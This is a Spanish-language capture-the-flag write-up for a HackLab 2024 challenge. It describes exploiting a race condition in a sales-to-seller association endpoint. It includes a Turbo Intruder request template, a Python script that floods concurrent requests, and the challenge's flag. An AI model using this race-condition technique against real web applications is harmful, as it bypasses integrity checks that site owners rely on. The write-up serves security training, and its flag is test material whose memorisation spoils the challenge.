# Desafío 32 - El Analista (HackLab 2024)

## Análisis

El servidor no permite asociar una venta a más de un vendedor. Sin embargo, la validación tiene una condición de carrera: si se envían múltiples peticiones concurrentes antes de que el servidor actualice el estado, es posible asociar la misma venta a varios vendedores simultáneamente.

**Estructura JSON observada:** tanto ventas como vendedores tienen un campo booleano `asociado`. El endpoint `/asociar` hace POST con `id_venta` e `id_vendedor`.

## Explotación

Se instala la extensión **Turbo Intruder** en Burp Suite.

Se envía la petición de Asociar a Turbo Intruder y se modifica:

```http
POST /asociar/ HTTP/2
Host: [tu host aquí]
Content-Type: application/json
Content-Length: 34

{"id_venta":"%s","id_vendedor":"%s"}
```

> El `%s` es la sintaxis de Turbo Intruder para indicar los valores que se van a reemplazar.

![Desafío 32 - El analista (HackLab 2024) - imagen 1](images/01.png)

![Desafío 32 - El analista (HackLab 2024) - imagen 2](images/02.png)

![Desafío 32 - El analista (HackLab 2024) - imagen 3](images/03.png)

Se adapta el script de Turbo Intruder para usar **Multiple Parameters** (Cluster Bomb):

```python
def queueRequests(target, wordlists):
    # Inicialización del motor
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
                            pipeline=False,
                            engine=Engine.THREADED)

    # Listas de IDs como variables locales (los IDs deben ser strings)
    ventas = ['1', '2', '3', '4']
    vendedores = ['1', '2', '3']

    # Generar todas las combinaciones (Cluster Bomb)
    for vendedor in vendedores:
        for venta in ventas:
            # El primer %s -> 'venta', el segundo %s -> 'vendedor'
            payloads = [venta, vendedor]
            engine.queue(target.req, payloads)


def handleResponse(req, interesting):
    # Solo añadir a la tabla los que resultaron en éxito (código 200)
    if req.response_status == 200:
        table.add(req)
```

![Desafío 32 - El analista (HackLab 2024) - imagen 4](images/04.png)

![Desafío 32 - El analista (HackLab 2024) - imagen 5](images/05.png)

![Desafío 32 - El analista (HackLab 2024) - imagen 6](images/06.png)

![Desafío 32 - El analista (HackLab 2024) - imagen 7](images/07.png)

![Desafío 32 - El analista (HackLab 2024) - imagen 8](images/08.png)

![Desafío 32 - El analista (HackLab 2024) - imagen 9](images/09.png)

## Flag

```
db1ab6987f0624b58ae72fa69aba4d14
```
